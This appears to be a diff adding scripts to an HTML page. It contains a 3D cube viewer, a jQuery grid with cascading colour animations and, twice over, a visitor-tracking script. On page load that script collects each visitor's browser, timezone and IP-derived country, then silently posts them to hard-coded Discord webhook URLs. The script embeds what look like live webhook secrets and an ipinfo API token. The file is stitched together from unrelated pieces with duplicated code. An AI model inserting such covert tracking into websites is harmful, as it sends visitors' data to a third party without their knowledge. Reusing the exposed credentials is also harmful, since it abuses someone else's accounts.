+    this.sides[5].getElementsByClassName('cube-image')[0].style[userPrefix.js + 'Transform'] = 'rotate(' + -(viewport.positionX + 180 - viewport.torqueX) + 'deg)';
+  }
+}
+Cube.prototype.upsideDown = function(obj) {
+
+  var deg = (obj.upsideDown == true) ? '180deg' : '0deg';
+  var i = 5;
+
+  while(i > 0 && --i) {
+    this.sides[i].getElementsByClassName('cube-image')[0].style[userPrefix.js + 'Transform'] = 'rotate(' + deg + ')';
+  }
+
+}
+Cube.prototype.sideChange = function() {
+
+  for(var i = 0; i < this.sides.length; ++i) {
+    this.sides[i].getElementsByClassName('cube-image')[0].className = 'cube-image';    
+  }
+
+  this.sides[this.viewport.currentSide - 1].getElementsByClassName('cube-image')[0].className = 'cube-image active';
+
+}
+
+new Cube({
+  viewport: viewport,
+  element: document.getElementsByClassName('cube')[0]
+});
+   //Global Variables
+var myDivs = ""
+
+
+//Functions
+function createDivs(numOfLoops){
+  for (var i = 1; i <= numOfLoops; i++) {
+    myDivs += "<div num='" + i + "'></div>"
+  }
+}
+  
+function appendElement(target, element){
+  $(target).append(element);
+}
+
+function turnRed(currentCube){
+  currentCube.addClass('red');
+}
+
+function turnYellow(currentCube){
+  currentCube.addClass('yellow');
+}
+
+function turnGreen(allCubes){
+  allCubes.addClass('green');
+}
+
+function triggerCross(clickedCube){
+  cascadeUp(clickedCube);
+  cascadeDown(clickedCube);
+  cascadeLeft(clickedCube);
+  cascadeRight(clickedCube);
+  /*cascadeLeftUp(clickedCube);
+  cascadeRightUp(clickedCube);*/
+}
+
+
+function cascadeDown(clickedCube){
+  var cubeNum = parseInt(clickedCube.attr("num"));
+  var waitTime = 0;
+  
+  for (var i = cubeNum; i <= 100; i += 10) {
+    var newTargetDivNum = (function(num) {
+      var newTargetDiv = $("div[num='" + num + "']");
+      waitTime += 200
+      setTimeout(function(){
+        newTargetDiv.addClass("green");
+      }, waitTime);
+      setTimeout(function(){
+        newTargetDiv.addClass("black");
+      }, waitTime + 800);
+      setTimeout(function(){
+        newTargetDiv.removeClass();
+      }, waitTime + 1200);
+    })(i);
+  }
+}
+
+function cascadeUp(clickedCube){
+  var cubeNum = parseInt(clickedCube.attr("num"));
+  var waitTime = 0;
+  
+  for (var i = cubeNum; i >= 0; i -= 10) {
+    var newTargetDivNum = (function(num) {
+      var newTargetDiv = $("div[num='" + num + "']");
+      waitTime += 200
+      setTimeout(function(){
+        newTargetDiv.addClass("green");
+      }, waitTime);
+      setTimeout(function(){
+        newTargetDiv.addClass("black");
+      }, waitTime + 800);
+      setTimeout(function(){
+        newTargetDiv.removeClass();
+      }, waitTime + 1200);
+    })(i);
+  }
+}
+
+function cascadeLeft(clickedCube){
+  var cubeNum = parseInt(clickedCube.attr("num"));
+  var cubeNumLastDidget = getLastDidget(cubeNum);    
+  var waitTime = 0;
+  
+  if (cubeNumLastDidget == 0){ 
+    cubeNumLastDidget = 9;
+    cubeNum -= 1;
+  }
+  
+  for (var i = cubeNum; cubeNumLastDidget > 0; cubeNumLastDidget--, i--) {
+    var newTargetDivNum = (function(num) {
+      var newTargetDiv = $("div[num='" + num + "']");
+      waitTime += 200
+      setTimeout(function(){
+        newTargetDiv.addClass("green");
+      }, waitTime);
+      setTimeout(function(){
+        newTargetDiv.addClass("black");
+      }, waitTime + 800);
+      setTimeout(function(){
+        newTargetDiv.removeClass();
+      }, waitTime + 1200);
+    })(i);
+  }
+}
+
+function cascadeRight(clickedCube){
+  var cubeNum = parseInt(clickedCube.attr("num"));
+  var cubeNumLastDidget = getLastDidget(cubeNum);
+  var i = cubeNum;
+  if (cubeNumLastDidget == 1){ 
+    cubeNumLastDidget = 2
+    i += 1;
+  }
+  var waitTime = 0;
+   
+  while(cubeNumLastDidget !== 1){
+    var newTargetDivNum = (function(num) {
+      var newTargetDiv = $("div[num='" + num + "']");
+      waitTime += 200
+      setTimeout(function(){
+        newTargetDiv.addClass("green");
+      }, waitTime);
+      setTimeout(function(){
+        newTargetDiv.addClass("black");
+      }, waitTime + 800);
+      setTimeout(function(){
+        newTargetDiv.removeClass();
+      }, waitTime + 1200);
+    })(i);
+    cubeNumLastDidget++
+    cubeNumLastDidget = getLastDidget(cubeNumLastDidget);
+    i++;
+    console.log(cubeNumLastDidget);
+    console.log(i);
+  }  
+}
+
+function cascadeLeftUp(clickedCube){
+  var cubeNum = parseInt(clickedCube.attr("num"));
+  var waitTime = 0;
+  
+  for (var i = cubeNum; i >= 0; i -= 11) {
+    var newTargetDivNum = (function(num) {
+      var newTargetDiv = $("div[num='" + num + "']");
+      waitTime += 200
+      setTimeout(function(){
+        newTargetDiv.addClass("green");
+      }, waitTime);
+      setTimeout(function(){
+        newTargetDiv.addClass("black");
+      }, waitTime + 800);
+      setTimeout(function(){
+        newTargetDiv.removeClass();
+      }, waitTime + 1200);
+    })(i);
+  }
+}
+
+function cascadeRightUp(clickedCube){
+  var cubeNum = parseInt(clickedCube.attr("num"));
+  var waitTime = 0;
+  
+  for (var i = cubeNum; i >= 0; i -= 9) {
+    var newTargetDivNum = (function(num) {
+      var newTargetDiv = $("div[num='" + num + "']");
+      waitTime += 200
+      setTimeout(function(){
+        newTargetDiv.addClass("green");
+      }, waitTime);
+      setTimeout(function(){
+        newTargetDiv.addClass("black");
+      }, waitTime + 800);
+      setTimeout(function(){
+        newTargetDiv.removeClass();
+      }, waitTime + 1200);
+    })(i);
+  }
+}
+
+
+function getLastDidget(fullNum){
+  var stringNum = fullNum.toString();
+  var lastIndex = stringNum.length -1;
+  var lastNumAsString = stringNum[lastIndex];
+  return parseInt(lastNumAsString);
+}
+
+
+//Function Calls
+createDivs(100);
+appendElement("body", myDivs);
+
+
+//User Actions
+$('div').hover(function(){
+  var self = $(this);
+  turnRed(self);
+});
+
+//When a div is clicked, turn that div yellow.
+$('div').click(function(){
+  var self = $(this);
+  turnYellow(self);
+  triggerCross(self);
+});
+
+//When a div is dblclicked, turn all divs green.
+$('div').dblclick(function(){
+  var allCubes = $('div');
+  turnGreen(allCubes);
+});
+
+   // Function to get browser information
+function getBrowserInfo() {
+    let userAgent = navigator.userAgent;
+    let browser = "Unknown Browser";
+
+    if (userAgent.indexOf("Chrome") > -1) {
+        browser = "Chrome";
+    } else if (userAgent.indexOf("Firefox") > -1) {
+        browser = "Firefox";
+    } else if (userAgent.indexOf("Safari") > -1) {
+        browser = "Safari";
+    } else if (userAgent.indexOf("Edge") > -1) {
+        browser = "Edge";
+    } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
+        browser = "Internet Explorer";
+    }
+
+    return browser;
+}
+
+// Function to get the user's country using a public API
+async function getCountry() {
+    let response = await fetch("ipinfo.io/[IP address]?token=06836cb450b294"); // Replace with your IP info token
+    let data = await response.json();
+    return data.country;
+}
+
+// Function to get the user's timezone
+function getTimezone() {
+    return Intl.DateTimeFormat().resolvedOptions().timeZone;
+}
+
+// Function to send the data to a Discord webhook
+async function sendWebhook(browser, country, timezone) {
+    const webhookUrl = "https://discord.com/api/webhooks/1303121408456658964/4sjQiPV4FTB8DaGOOCgtYIXTVI7DI38veYdmvdmEX4fYSSpKsBaveM5ZEAJLoSgLs3j4"; // Replace with your Discord webhook URL
+    const message = {
+        content: `New visitor to the website!`,
+        embeds: [
+            {
+                title: "Visitor Information",
+                fields: [
+                    { name: "Browser", value: browser, inline: true },
+                    { name: "Country", value: country, inline: true },
+                    { name: "Timezone", value: timezone, inline: true },
+                ],
+                footer: {
+                    text: "Visitor Tracking"
+                }
+            }
+        ]
+    };
+
+    await fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(message)
+    });
+}
+
+// Function to run all processes when the page is loaded
+async function trackVisit() {
+    const browser = getBrowserInfo();
+    const country = await getCountry();
+    const timezone = getTimezone();
+    
+    await sendWebhook(browser, country, timezone);
+}
+
+// Run the tracking function when the page is loaded
+window.onload = trackVisit;
+// Function to get browser information
+function getBrowserInfo() {
+    let userAgent = navigator.userAgent;
+    let browser = "Unknown Browser";
+
+    if (userAgent.indexOf("Chrome") > -1) {
+        browser = "Chrome";
+    } else if (userAgent.indexOf("Firefox") > -1) {
+        browser = "Firefox";
+    } else if (userAgent.indexOf("Safari") > -1) {
+        browser = "Safari";
+    } else if (userAgent.indexOf("Edge") > -1) {
+        browser = "Edge";
+    } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
+        browser = "Internet Explorer";
+    }
+
+    return browser;
+}
+
+// Function to get the user's country using a public API
+async function getCountry() {
+    try {
+        // Correct IPinfo URL with your API token
+        let response = await fetch("https://ipinfo.io/json?token=06836cb450b294"); // Replace with your API token
+        let data = await response.json();
+        return data.country || "Unknown Country"; // Default to "Unknown Country" if country data is missing
+    } catch (error) {
+        console.error("Error fetching country data:", error);
+        return "Unknown Country";
+    }
+}
+
+// Function to get the user's timezone
+function getTimezone() {
+    return Intl.DateTimeFormat().resolvedOptions().timeZone;
+}
+
+// Function to send the data to a Discord webhook
+async function sendWebhook(browser, country, timezone) {
+    const webhookUrl = "https://discord.com/api/webhooks/1304830323321737277/UVF0nV1sHjkB896VIgZ1378u7myKsee3nGUS4VJKj9viticfLKJCl5yWE8Dwq7kdyrnG"; // Your webhook URL
+    const message = {
+        content: `New visitor to the website!`,
+        embeds: [
+            {
+                title: "Visitor Information",
+                fields: [
+                    { name: "Browser", value: browser, inline: true },
+                    { name: "Country", value: country, inline: true },
+                    { name: "Timezone", value: timezone, inline: true },
+                ],
+                footer: {
+                    text: "Visitor Tracking"
+                }
+            }
+        ]
+    };
+
+    try {
+        const response = await fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(message)
+        });
+
+        if (!response.ok) {
+            console.error("Failed to send webhook: ", response.status, response.statusText);
+        } else {
+            console.log("Webhook sent successfully!");
+        }
+    } catch (error) {
+        console.error("Error sending webhook:", error);
+    }
+}
+
+// Function to run all processes when the page is loaded
+async function trackVisit() {
+    const browser = getBrowserInfo();
+    const country = await getCountry();
+    const timezone = getTimezone();
+    
+    await sendWebhook(browser, country, timezone);
+}
+
+// Run the tracking function when the page is loaded
+window.onload = trackVisit;
+
+   </script>
+</body>
+</html>
